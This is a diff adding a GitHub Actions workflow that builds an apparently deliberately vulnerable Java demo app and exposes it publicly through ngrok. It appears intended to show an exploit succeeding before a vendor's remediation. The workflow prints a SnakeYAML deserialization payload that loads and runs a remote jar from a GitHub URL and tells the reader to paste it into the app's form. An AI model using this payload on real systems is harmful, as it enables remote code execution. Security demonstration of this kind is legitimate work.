@@ -1,0 +1,36 @@
+name: Build and Run (Unpatched)
+
+# Runs the vulnerable application WITHOUT Seal Security remediation.
+# Use this to demonstrate the exploit succeeding before remediation.
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build-and-run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+          cache: 'maven'
+
+      - name: Build Application
+        run: mvn clean package -DskipTests
+
+      - name: Run Server with ngrok
+        run: |
+          wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+          tar xvzf ngrok-v3-stable-linux-amd64.tgz
+          ./ngrok config add-authtoken ${{ secrets.NGROK_TOKEN }}
+          ./ngrok http --url=${{ vars.NGROK_URL }} 8080 &
+          sleep 3
+          echo "App:     https://${{ vars.NGROK_URL }}"
+          echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar\"]]]]"
+          echo "Paste the payload into the name field and click Go"
+          java -jar target/jfrog-maven-demo-1.0.0.jar
